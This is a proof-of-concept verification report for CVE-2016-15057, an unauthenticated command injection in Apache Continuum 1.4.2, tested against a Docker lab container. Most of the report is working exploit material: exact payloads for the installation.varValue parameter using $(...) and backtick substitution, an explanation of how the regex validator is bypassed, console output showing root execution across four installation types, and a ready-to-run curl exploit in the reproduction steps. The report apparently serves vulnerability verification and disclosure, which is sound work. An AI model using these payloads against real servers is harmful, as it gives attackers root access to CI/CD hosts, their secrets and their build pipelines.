# PoC Verification Report: CVE-2016-15057

## CVE ID
CVE-2016-15057

## Vulnerability
Unauthenticated OS Command Injection in Apache Continuum 1.4.2 via `installation.varValue` parameter in `saveInstallation.action` endpoint.

## Verification Status
**CONFIRMED** — All three attack vectors successfully demonstrated.

---

## PoC Scripts

### 1. Primary PoC: `poc.py` — $(command) Substitution
- **Location**: `poc/poc.py`
- **Vector**: `$(command)` substitution in `installation.varValue` parameter
- **Key Feature**: Passes the Struts2 regex validator since `$`, `(`, `)` are all allowed characters
- **Verification Methods**: File-based (id > /tmp/proof) + time-based (sleep 5)
- **Language**: Python 3 (stdlib only — http.client, urllib.parse)

### 2. Vector 2: `poc_vector2_backtick.py` — Backtick Injection
- **Location**: `poc/poc_vector2_backtick.py`
- **Vector**: `` `command` `` backtick substitution
- **Key Feature**: Proves regex validator is bypassable — backticks fail regex but the `installationValidator` still executes because `short-circuit="true"` is not set
- **Verification Methods**: File-based + time-based

### 3. Vector 3: `poc_vector3_multi_type.py` — Multiple Installation Types
- **Location**: `poc/poc_vector3_multi_type.py`
- **Vector**: Tests all four installation types that trigger immediate execution: `jdk`, `maven2`, `maven1`, `ant`
- **Key Feature**: Proves the vulnerability exists across all installation types with ExecutorConfigurators, not just `jdk`

---

## Test Results

### Test Environment
- **Target Container**: `cve-2016-15057-vulnerable`
- **Container IP**: `172.19.0.6` (lab-net network)
- **Target Port**: 8080
- **Application**: Apache Continuum 1.4.2 (pre-built binary)
- **Java Runtime**: OpenJDK 1.7.0_352 (Azul Zulu 7.56.0.11)
- **OS**: Ubuntu 22.04 (container)
- **Execution Context**: root (uid=0)

### Vector 1: $(command) Substitution — CONFIRMED

**Command:**
```bash
python3 poc/poc.py 172.19.0.6 8080
```

**Output:**
```
╔══════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection ║
║  Vector: $(command) substitution (pre-auth)          ║
╚══════════════════════════════════════════════════════╝

[*] Step 1: Checking target http://172.19.0.6:8080/continuum/
[!] Unexpected response (HTTP 302). Target may not be Continuum.
[*] Step 2: Injecting command via $(command) substitution
    Endpoint: POST /continuum/saveInstallation.action
    Payload:  installation.varValue=$(id > /tmp/cve_2016_15057_proof && echo CVE-2016-15057 >> /tmp/cve_2016_15057_proof && date >> /tmp/cve_2016_15057_proof)
    Type:     jdk
    Response: HTTP 200 (7155 bytes)

[*] Step 3: Verifying command execution
[+] COMMAND INJECTION CONFIRMED!
[+] Proof file contents (/tmp/cve_2016_15057_proof):
    uid=0(root) gid=0(root) groups=0(root)
CVE-2016-15057
Sat Feb 28 05:23:18 PM UTC 2026

[*] Time-based verification: injecting $(sleep 5)
[*] Step 2: Injecting command via $(command) substitution
    Endpoint: POST /continuum/saveInstallation.action
    Payload:  installation.varValue=$(sleep 5)
    Type:     jdk
    Response: HTTP 302 (0 bytes)
    Response time: 5.2s (expected >= 5s if vulnerable)
[+] Time-based injection confirmed! Response delayed by ~5.2s

============================================================
[✓] VULNERABILITY CONFIRMED: CVE-2016-15057
    Unauthenticated command injection in Apache Continuum 1.4.2
    Vector: $(command) substitution in installation.varValue
    Execution context: uid=0(root) gid=0(root) groups=0(root)
============================================================
```

**Evidence:**
- File proof: `/tmp/cve_2016_15057_proof` contains `uid=0(root) gid=0(root) groups=0(root)` — confirms arbitrary command execution as root
- Time proof: `$(sleep 5)` caused 5.2s delay — confirms blind execution timing
- No authentication required — request sent without any cookies or credentials

---

### Vector 2: Backtick Injection — CONFIRMED

**Command:**
```bash
python3 poc_vector2_backtick.py 172.19.0.6 8080
```

**Output:**
```
╔══════════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection     ║
║  Vector 2: Backtick (`command`) substitution              ║
║  Note: Fails regex but runs anyway (no short-circuit)    ║
╚══════════════════════════════════════════════════════════════╝

[*] Test 1: File-based proof via backtick injection
[*] Injecting via backtick substitution
    Payload: installation.varValue=`id > /tmp/cve_2016_15057_backtick_proof`
    Response: HTTP 200 (7051 bytes)
[+] BACKTICK INJECTION CONFIRMED!
[+] Proof: uid=0(root) gid=0(root) groups=0(root)

[*] Test 2: Time-based verification via backtick injection
[*] Injecting via backtick substitution
    Payload: installation.varValue=`sleep 5`
    Response: HTTP 200 (7016 bytes)
    Response time: 5.2s (expected >= 5s)
[+] Time-based backtick injection confirmed!

============================================================
[✓] VECTOR 2 CONFIRMED: Backtick injection works
    Regex validator rejects backticks but NO short-circuit
    InstallationValidator still executes the shell command
============================================================
```

**Key Insight**: Even though backticks (`` ` ``) are NOT in the regex allowlist `(?:[~A-Za-z0-9_.:=${}\\/\-+]|\s|[()])*`, the injection still works because the regex validator does not use `short-circuit="true"`. The `installationValidator` custom validator runs regardless of regex failure.

---

### Vector 3: Multiple Installation Types — ALL 4 CONFIRMED

**Command:**
```bash
python3 poc_vector3_multi_type.py 172.19.0.6 8080
```

**Output:**
```
╔════════════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection       ║
║  Vector 3: All installation types (jdk, maven2, maven1, ant)║
╚════════════════════════════════════════════════════════════╝

[*] Testing installation type: jdk
    Server will construct: $(...)/bin/java -version
    Response: HTTP 200 (7053 bytes)
    [+] CONFIRMED: type=jdk uid=0

[*] Testing installation type: maven2
    Server will construct: $(...)/bin/mvn -v
    Response: HTTP 200 (7262 bytes)
    [+] CONFIRMED: type=maven2 uid=0

[*] Testing installation type: maven1
    Server will construct: $(...)/bin/maven -v
    Response: HTTP 200 (7273 bytes)
    [+] CONFIRMED: type=maven1 uid=0

[*] Testing installation type: ant
    Server will construct: $(...)/bin/ant -version
    Response: HTTP 200 (7275 bytes)
    [+] CONFIRMED: type=ant uid=0

============================================================
Installation Type Injection Results:
============================================================
  ✓ jdk      — CONFIRMED
  ✓ maven2   — CONFIRMED
  ✓ maven1   — CONFIRMED
  ✓ ant      — CONFIRMED

  4/4 installation types vulnerable

[✓] VECTOR 3 CONFIRMED: Multiple installation types exploitable
============================================================
```

---

## Vulnerability Demonstrated

### What the PoC Proves

1. **Unauthenticated RCE**: No authentication, session cookies, or CSRF tokens are needed. The command injection occurs during the Struts2 validation phase, which executes BEFORE the authorization interceptor (`redbackSecureActions`).

2. **Root Execution**: Commands execute as `uid=0(root)`, meaning full system compromise.

3. **Multiple Injection Syntaxes**: Both `$(command)` and `` `command` `` work:
   - `$(command)` passes the regex validator cleanly (characters `$`, `(`, `)` are allowed)
   - `` `command` `` fails regex but the custom validator still fires (no `short-circuit`)

4. **Broad Attack Surface**: All four installation types with ExecutorConfigurators (`jdk`, `maven2`, `maven1`, `ant`) are vulnerable — not just `jdk`.

5. **Blind Injection**: Command output is not reflected in the HTTP response, but execution is confirmed via file writes and time-based delays.

### Attack Flow
```
Attacker                           Apache Continuum 1.4.2
   |                                       |
   |  POST /continuum/saveInstallation.action
   |  installation.name=test               |
   |  installation.type=jdk                |
   |  installation.varValue=$(COMMAND)     |
   |-------------------------------------->|
   |                                       |
   |    Struts2 Interceptor Stack:         |
   |    1. redbackForceAdminUser (pass)    |
   |    2. redbackAutoLogin (pass)         |
   |    3. defaultStack:                   |
   |       - regex validator ($(cmd) passes)|
   |       - installationValidator:         |
   |         → getExecutorConfiguratorVersion()
   |         → Commandline("$(cmd)/bin/java")
   |         → /bin/sh -c '"$(cmd)/bin/java" -version'
   |         → COMMAND EXECUTES AS ROOT    |
   |    4. redbackSecureActions (NEVER REACHED)
   |                                       |
   |  HTTP 200 (validation error page)     |
   |<--------------------------------------|
```

---

## Notes & Observations

1. **Response Codes**: The injection with `$(id > /tmp/proof)` returns HTTP 200 with a validation error page. The `$(sleep 5)` injection returns HTTP 302 — likely because the sleep causes a timeout in the version-check logic which changes the validation flow.

2. **Execution is Immediate**: Commands execute during the HTTP request processing (validation phase), not asynchronously. Time-based verification confirms this.

3. **No Rate Limiting**: Multiple rapid injections work without issue. No lockout or rate limiting on the endpoint.

4. **Prerequisite**: The initial admin setup wizard must have been completed (the `redbackForceAdminUser` interceptor redirects to admin creation otherwise). In the lab, the entrypoint script handles this automatically.

5. **Real-World Impact**: This is a CVSS 9.9 critical vulnerability in a CI/CD server. In a real environment, exploiting this would give access to build secrets, source code, deployment credentials, and the ability to inject backdoors into software builds (supply chain attack).

---

## Reproduction Steps

```bash
# 1. Start the lab
cd CVE-2016-15057
docker compose up -d

# 2. Wait for healthy status (~60-90s)
docker inspect cve-2016-15057-vulnerable --format '{{.State.Health.Status}}'

# 3. Get container IP
CONTAINER_IP=$(docker inspect cve-2016-15057-vulnerable --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# 4. Run the PoC
python3 poc/poc.py $CONTAINER_IP 8080

# 5. Manual verification (alternative)
curl -X POST "http://${CONTAINER_IP}:8080/continuum/saveInstallation.action" \
  --data-urlencode "installation.name=test" \
  --data-urlencode "installation.type=jdk" \
  --data-urlencode 'installation.varValue=$(id > /tmp/pwned)'
docker exec cve-2016-15057-vulnerable cat /tmp/pwned
# Expected: uid=0(root) gid=0(root) groups=0(root)
```
